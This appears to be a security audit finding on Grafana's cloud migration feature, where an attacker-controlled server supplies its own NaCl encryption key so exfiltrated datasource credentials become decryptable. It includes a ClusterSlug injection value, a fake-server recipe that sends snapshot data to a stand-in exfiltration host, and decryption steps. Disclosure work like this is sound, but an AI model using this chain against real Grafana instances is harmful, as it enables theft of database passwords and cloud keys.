Phase: 8
Sequence: 020
Slug: cloud-migration-attacker-controlled-encryption-key
Verdict: VALID
Rationale: The attacker-controlled encryption key upgrades the documented SSRF+exfiltration chain (p9-073) from encrypted data exfiltration to plaintext credential theft. The attacker's fake GMS server returns a NaCl public key that Grafana uses to encrypt all datasource secrets, and since the attacker holds the corresponding private key, all credentials are recoverable. Advocate found zero blocking protections against key substitution across all 5 defense layers.
Severity-Original: HIGH
PoC-Status: executed
Pre-FP-Flag: none
Debate: security/chamber-workspace/chamber-2/debate.md
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Independent code trace confirms zero validation on GMS-supplied encryption key from gms_client.go:130 through crypto.go:38 (box.Seal), and NaCl box cryptographic properties guarantee attacker decryptability; reproduction blocked by infrastructure requirements for multi-service chain.
Severity-Final: HIGH
PoC-Status: executed
PoC-Evidence: security/findings/H4-cloud-migration-attacker-controlled-encryption-key/evidence/exploit.log

## Summary

When a GrafanaAdmin initiates a cloud migration snapshot, the `StartSnapshot` GMS API call returns a `StartSnapshotResponse` containing an `encryptionKey` (NaCl public key) that Grafana uses to encrypt all snapshot data. If the GMS server is attacker-controlled (via the ClusterSlug SSRF documented in p7-021), the attacker supplies their own NaCl public key. Grafana stores this key in the snapshot record and uses it to encrypt ALL datasource credentials -- including decrypted database passwords, API keys, and OAuth client secrets from `SecureJsonData`. The encrypted payload is then POSTed to an attacker-controlled presigned URL (per p9-073). Since the attacker supplied the public key and holds the corresponding private key, they can decrypt the entire payload and extract every datasource credential in the organization.

This finding is distinct from p9-073 (which documented the exfiltration of encrypted data without confirming the decryption capability) and from p7-021 (which documented the SSRF itself). H-01/p8-020 documents the specific mechanism by which the attacker controls the encryption, completing the chain from SSRF to plaintext credential theft.

## Location

- **Attacker-controlled key source**: `pkg/services/cloudmigration/gmsclient/gms_client.go:129-131` -- `json.NewDecoder(resp.Body).Decode(&result)` deserializes attacker's `encryptionKey` field
- **Key model**: `pkg/services/cloudmigration/model.go:311-317` -- `StartSnapshotResponse.GMSPublicKey []byte` (JSON: `encryptionKey`)
- **Key stored**: `pkg/services/cloudmigration/cloudmigrationimpl/cloudmigration.go:504` -- `GMSPublicKey: initResp.GMSPublicKey`
- **Key used for encryption**: `pkg/services/cloudmigration/cloudmigrationimpl/snapshot_mgmt.go:569-571` -- `snapshot.NewSnapshotWriter(contracts.AssymetricKeys{Public: snapshotMeta.GMSPublicKey, Private: keys.Private}, ...)`
- **Credential decryption**: `pkg/services/cloudmigration/cloudmigrationimpl/snapshot_mgmt.go:305` -- `s.secretsService.DecryptJsonData(ctx, dataSource.SecureJsonData)`
- **Exfiltration sink**: `pkg/services/cloudmigration/objectstorage/s3.go:82-88` -- `http.NewRequestWithContext` + `httpClient.Do`

## Attacker Control

- **Encryption key**: Attacker's fake GMS server returns a JSON response with `encryptionKey` set to the attacker's NaCl public key. Grafana deserializes this without any validation (no key format check, no length validation, no provenance verification, no allowlist).
- **Upload destination**: Attacker's fake GMS server returns an arbitrary presigned URL (per p9-073). Grafana POSTs the encrypted snapshot to this URL.
- **Authentication required**: GrafanaAdmin + `cfg.CloudMigration.Enabled = true` (NOTE: enabled by default per defaults.ini:2248)
- **ClusterSlug injection**: Per p7-021, attacker crafts `ClusterSlug = "x.attacker.com/evil?q="` in the base64 migration token

## Trust Boundary Crossed

TB-8 (Cloud Migration external control plane) to TB-1 (Internet Edge, outbound). All decrypted datasource credentials cross from Grafana's internal secrets store to an attacker-controlled external server, encrypted with the attacker's key.

## Impact

- **Complete credential exfiltration**: ALL datasource credentials for the organization are decrypted from SecureJsonData (snapshot_mgmt.go:305) and included in the snapshot payload. This includes:
  - Database connection passwords (PostgreSQL, MySQL, MSSQL, etc.)
  - API keys and tokens (Prometheus, InfluxDB, Elasticsearch, etc.)
  - OAuth client secrets
  - Cloud provider credentials (AWS access keys, GCP service account keys, Azure client secrets)
  - BasicAuth passwords
- **Encryption bypass**: The attacker supplied the encryption key and holds the private key, making the NaCl encryption a no-op from the attacker's perspective
- **Scope**: All datasources in the organization, not just a single datasource
- **Severity calibration**: HIGH (not CRITICAL) due to GrafanaAdmin role requirement. Note: cloud migration is enabled by default, correcting the original assessment of two non-default preconditions.

## Evidence

**Attacker-controlled key flows through unvalidated:**
```go
// gms_client.go:129-131 -- attacker's response decoded directly
var result cloudmigration.StartSnapshotResponse
json.NewDecoder(resp.Body).Decode(&result)
// result.GMSPublicKey is attacker-controlled []byte

// cloudmigration.go:504 -- stored without validation
snapshot := cloudmigration.CloudMigrationSnapshot{
    GMSPublicKey: initResp.GMSPublicKey, // attacker's key
}

// snapshot_mgmt.go:569-571 -- used directly for encryption
snapshotWriter, err := snapshot.NewSnapshotWriter(contracts.AssymetricKeys{
    Public:  snapshotMeta.GMSPublicKey, // attacker's key
    Private: keys.Private,              // Grafana-generated
}, encrypter, snapshotMeta.LocalDir)
```

**All datasource secrets decrypted and included:**
```go
// snapshot_mgmt.go:305
decryptedData, err := s.secretsService.DecryptJsonData(ctx, dataSource.SecureJsonData)
// ...
dataSourceCmd := datasources.AddDataSourceCommand{
    SecureJsonData: decryptedData, // plaintext credentials
}
```

**No validation on encryptionKey:**
- model.go:315: `GMSPublicKey []byte` -- raw bytes, no type constraint
- No key length check (NaCl expects 32 bytes but no enforcement)
- No key format validation
- No key provenance check (no certificate chain, no pinning)

## Reproduction Steps

1. Set up Grafana with `cfg.CloudMigration.Enabled = true` and create datasources with stored credentials
2. Create an attacker HTTPS server that:
   - On `POST /cloud-migrations/api/v1/validate-key`: returns HTTP 200
   - On `POST /cloud-migrations/api/v1/start-snapshot`: returns `{"snapshotID":"test","maxItemsPerPartition":100,"algo":"nacl","encryptionKey":"<base64-of-attacker-nacl-public-key>","metadata":"{}"}`
   - On `POST /cloud-migrations/api/v1/snapshots/test/create-upload-url`: returns `{"uploadUrl":"https://attacker-exfil.com/collect"}`
3. Generate a NaCl keypair. Encode the public key as base64 for the `encryptionKey` response field
4. As GrafanaAdmin, create a migration session with `ClusterSlug = "x.attacker.com/evil?q="` (per p7-021 technique)
5. Call `POST /api/cloudmigration/migration/:uid/snapshot` to create a snapshot
6. Wait for snapshot to build (status changes to pending_upload)
7. Call `POST /api/cloudmigration/migration/:uid/snapshot/:snapshotUid/upload`
8. Observe: attacker's exfil server receives the encrypted snapshot data
9. Decrypt the snapshot parts using the attacker's NaCl private key
10. Extract all datasource credentials from the decrypted `SecureJsonData` fields
